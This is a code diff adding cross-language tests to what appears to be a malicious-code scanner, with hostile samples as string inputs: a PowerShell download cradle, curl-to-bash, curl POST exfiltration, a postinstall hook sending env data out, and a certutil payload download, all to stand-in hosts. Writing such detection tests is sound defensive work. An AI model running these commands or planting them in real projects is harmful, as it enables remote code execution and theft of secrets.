@@ -426,3 +426,80 @@ describe("loadRiskConfig from env", () => {
     restoreEnv();
   });
 });
+
+// ── Multi-language code coverage ─────────────────────────────────────────
+
+describe("cross-language detection", () => {
+  test("PowerShell encoded command and IEX cradle trigger CMD_OBFUSCATION", () => {
+    const ps1 = [
+      "Install-Tool.ps1",
+      "powershell -enc SQBnAG4AbwByAGUAIABwAHIAZQB2AGkAbwB1AHMA",
+      "iex (new-object net.webclient).downloadstring('https://evil.example/x.ps1')",
+    ].join("\n");
+    expect(ruleIds(scan(ps1))).toContain("CMD_OBFUSCATION");
+  });
+
+  test("Node.js eval(Buffer.from(...)) triggers CMD_OBFUSCATION", () => {
+    const js = "const p = eval(Buffer.from('ZXZpbC1sb2FkZXI=', 'base64').toString());";
+    expect(ruleIds(scan(js))).toContain("CMD_OBFUSCATION");
+  });
+
+  test("Scala sys.process triggers SUBPROCESS_SPAWN", () => {
+    const scala = [
+      "import scala.sys.process._",
+      "val out = (\"curl -s https://evil.example/p.sh\" #| \"bash\").!!",
+    ].join("\n");
+    const result = scan(scala, { name: "scala-runner" });
+    expect(ruleIds(result)).toContain("SUBPROCESS_SPAWN");
+  });
+
+  test("Python subprocess with curl triggers SUBPROCESS_SPAWN + EXFIL_HTTP", () => {
+    const py = [
+      "import subprocess, sys",
+      "r = subprocess.run(['curl', '-X', 'POST', '-d', data, 'https://collector.example/up'], capture_output=True)",
+    ].join("\n");
+    const result = scan(py);
+    expect(ruleIds(result)).toContain("SUBPROCESS_SPAWN");
+    expect(ruleIds(result)).toContain("EXFIL_HTTP");
+  });
+
+  test("Java Runtime.exec triggers SUBPROCESS_SPAWN", () => {
+    const java = 'Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});';
+    expect(ruleIds(scan(java))).toContain("SUBPROCESS_SPAWN");
+  });
+
+  test("Scala System.getenv triggers EXFIL_ENV", () => {
+    const scala = 'val token = System.getenv("NVIDIA_API_KEY")';
+    expect(ruleIds(scan(scala))).toContain("EXFIL_ENV");
+  });
+
+  test(".NET Process.Start triggers SUBPROCESS_SPAWN", () => {
+    const cs = 'Process.Start("powershell.exe", "-enc AAAA...")';
+    expect(ruleIds(scan(cs))).toContain("SUBPROCESS_SPAWN");
+  });
+
+  test("package.json postinstall hook triggers PKG_HOOK", () => {
+    const pkg = '{ "scripts": { "postinstall": "node collect.js && curl -X POST https://t.example -d @env.json" } }';
+    const result = scan(pkg);
+    expect(ruleIds(result)).toContain("PKG_HOOK");
+  });
+
+  test("benign package.json without hooks stays clean", () => {
+    const pkg = '{ "scripts": { "build": "tsc -b", "test": "bun test" } }';
+    expect(scan(pkg).findings).toHaveLength(0);
+  });
+
+  test("Windows certutil download triggers SILENT_INSTALL", () => {
+    const bat = "certutil -urlcache -f https://evil.example/svchost.exe %TEMP%\\svc.exe";
+    expect(ruleIds(scan(bat))).toContain("SILENT_INSTALL");
+  });
+
+  test("benign Scala code does not trigger SUBPROCESS_SPAWN", () => {
+    const scala = [
+      "import scala.collection.immutable._",
+      "val xs = List(1, 2, 3).map(_ * 2)",
+      "println(xs.sum)",
+    ].join("\n");
+    expect(scan(scala).findings).toHaveLength(0);
+  });
+});
